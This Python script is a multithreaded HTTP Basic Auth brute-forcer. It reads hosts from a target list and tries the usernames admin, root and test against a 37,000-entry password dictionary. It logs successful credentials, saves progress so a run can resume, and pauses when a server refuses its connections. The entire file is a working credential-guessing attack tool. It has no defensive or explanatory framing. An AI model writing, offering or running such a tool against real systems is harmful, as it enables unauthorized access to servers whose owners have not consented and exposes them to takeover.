import time
import json
import logging
import threading
import requests


username = ['admin', 'root', 'test']
password = []


def init_dict():
    with open('37k.txt', encoding='utf-8') as f:
        for line in f:
            line = line.rstrip('\n')
            password.append(line)


class ProgressManager:
    def __init__(self):
        self._progress = {}
        self._lock = threading.Lock()
        self._last_active_time = time.time()

    def update(self, target, progress):
        self._lock.acquire()
        self._progress[target] = progress
        current_time = time.time()
        if current_time < self._last_active_time:
            self._last_active_time = current_time
        elif (current_time - self._last_active_time) > 60.0:
            self._last_active_time = current_time
            with open('restore.json', 'w', encoding='utf-8') as f:
                json.dump(self._progress, f)
        self._lock.release()


class HTTPBrute(threading.Thread):
    HEADERS = {
        'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5'
                       '37.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36'),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en;q=0.9'
    }
    REQUEST_DELAY = 0.1
    RETRY_TIMES = 5
    RETRY_DELAY = 30.0  # status_code is not 200 or 401
    ACTIVE_REFUSE_DELAY = 300.0  # remote server close or ban the connection
    ALIVE_UNKNOWN = -1
    ALIVE_FALSE = 0
    ALIVE_TRUE = 1

    def __init__(self, progress, target):
        threading.Thread.__init__(self)
        self._progress = progress
        self._target = target
        self._alive = False

    def run(self):
        for total, idx, auth in get_authentication():
            self._progress.update(self._target, idx)
            for step in range(self.RETRY_TIMES):
                try:
                    response = requests.get(self._target, headers=self.HEADERS, auth=auth)
                    self._alive = True
                    if 200 <= response.status_code < 300:
                        if response.status_code == 200:  # brute success
                            logging.warning('[SUCCESS] {0} {1}'.format(self._target, str(auth)))
                            return
                        else:
                            print('[UNKNOWN 2XX] {0} {1}'.format(self._target, str(auth)))
                    elif 400 <= response.status_code < 500:
                        if response.status_code == 401:  # password error
                            print('[ERROR 401] {0:.2f}% {1} {2}'.format(100 * idx / total, self._target, str(auth)))
                            break
                        else:
                            print('[UNKNOWN 4XX] {0} {1}'.format(self._target, str(auth)))
                    else:
                        logging.warning('unknown status_code {0} {1}'.format(response.status_code, self._target))
                except ValueError as e:  # happened when codec error
                    print('ValueError: {0}'.format(e))
                    continue
                except requests.RequestException as e:
                    print('requests.RequestException: {0}'.format(e))
                except ConnectionError as e:
                    print('ConnectionError: {0}'.format(e))
                except TimeoutError as e:
                    print('TimeoutError: {0}'.format(e))
                except Exception as e:
                    logging.warning('unknown Exception {0} {1} {2}'.format(self._target, type(e), e))
                if step == (self.RETRY_TIMES - 1):
                    if self._alive:  # this host is alive but been refused actively
                        self._alive = False
                        time.sleep(self.ACTIVE_REFUSE_DELAY)
                    else:  # this host has never been connected
                        return
                else:
                    time.sleep(self.RETRY_DELAY)
            time.sleep(self.REQUEST_DELAY)
        return


def get_authentication():
    idx = 0
    total = len(username) * len(password)
    auth = None
    # first yield None for no-auth request
    yield total, idx, auth
    # then yield password list
    for p in password:
        for u in username:
            idx += 1
            auth = (u, p)
            yield total, idx, auth


def main():
    tasks = []
    progress = ProgressManager()
    with open('targets.txt') as f:
        for line in f:
            line = line.rstrip('\n')
            host, port = line.split(':')
            target = ''
            if port == '80':
                target = 'http://{0}/'.format(host)
            elif port == '443':
                target = 'https://{0}/'.format(host)
            else:
                target = 'http://{0}:{1}/'.format(host, port)
            t = HTTPBrute(progress, target)
            t.start()
            tasks.append(t)
    for t in tasks:
        t.join()


def init_logging():
    handler = logging.FileHandler(filename='brute.log')
    logging.basicConfig(handlers=[handler],
                        format='[%(levelname)s] %(asctime)s - %(message)s',
                        level=logging.WARNING)


if __name__ == '__main__':
    init_dict()
    init_logging()
    main()
